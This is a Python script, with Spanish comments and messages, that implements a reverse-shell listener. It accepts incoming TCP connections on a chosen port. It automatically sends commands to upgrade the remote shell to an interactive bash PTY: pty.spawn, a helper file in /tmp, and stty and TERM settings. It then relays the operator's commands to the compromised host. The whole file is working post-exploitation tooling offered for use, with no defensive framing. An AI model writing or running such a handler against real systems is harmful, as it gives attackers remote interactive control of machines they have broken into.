#!/usr/bin/env python3

import socket
import threading
import os
import sys
import select
import re
import time

# Expresión regular para limpiar la salida
ansi_escape = re.compile(rb'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
control_chars = re.compile(rb'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]')

def clean_output(data):
    data = ansi_escape.sub(b'', data)
    data = control_chars.sub(b'', data)
    return data.decode('utf-8', errors='ignore').strip()

def stabilize_shell(client):
    # Intentar diferentes versiones de Python
    python_commands = [
        b'python -c "import pty; pty.spawn(\'/bin/bash\')"\n',
        b'python3 -c "import pty; pty.spawn(\'/bin/bash\')"\n',
        b'echo "stty raw -echo; fg" > /tmp/.stab && chmod +x /tmp/.stab\n'
    ]
    
    # Enviar comandos de estabilización
    for cmd in python_commands:
        client.send(cmd)
        time.sleep(0.5)
    
    # Configurar entorno terminal
    client.send(b'export TERM=xterm-256color\n')
    client.send(b'stty rows 40 columns 180\n')
    # Desactivar el eco en el lado remoto
    client.send(b'stty -echo\n')
    time.sleep(1)

def handler(client, address, port):
    os.system('clear')
    print(f"[*] Escuchando en 0.0.0.0:{port}...\n")
    print(f"\n[+] Conexión de {address[0]}:{address[1]}")
    print("[*] Shell activa\n")
    
    # Automatizar estabilización
    stabilize_shell(client)
    
    try:
        while True:
            sockets = [client, sys.stdin]
            read_sockets, _, _ = select.select(sockets, [], [])

            for sock in read_sockets:
                if sock == client:
                    data = client.recv(4096)
                    if not data:
                        print("\n[!] Cliente desconectado.")
                        return
                    print(clean_output(data), end='\n', flush=True)
                else:
                    cmd = sys.stdin.readline()
                    client.send(cmd.encode())
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")
    finally:
        client.close()

def start_server(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(5)

    print(f"[*] Escuchando en 0.0.0.0:{port}...\n")

    try:
        while True:
            client, addr = server.accept()
            thread = threading.Thread(target=handler, args=(client, addr, port))
            thread.start()
    except KeyboardInterrupt:
        print("\n[!] Cerrando servidor.")
    finally:
        server.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <puerto>")
        sys.exit(1)

    try:
        port = int(sys.argv[1])
        start_server(port)
    except ValueError:
        print("[!] El puerto debe ser un número.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Servidor detenido.")
        sys.exit(0)
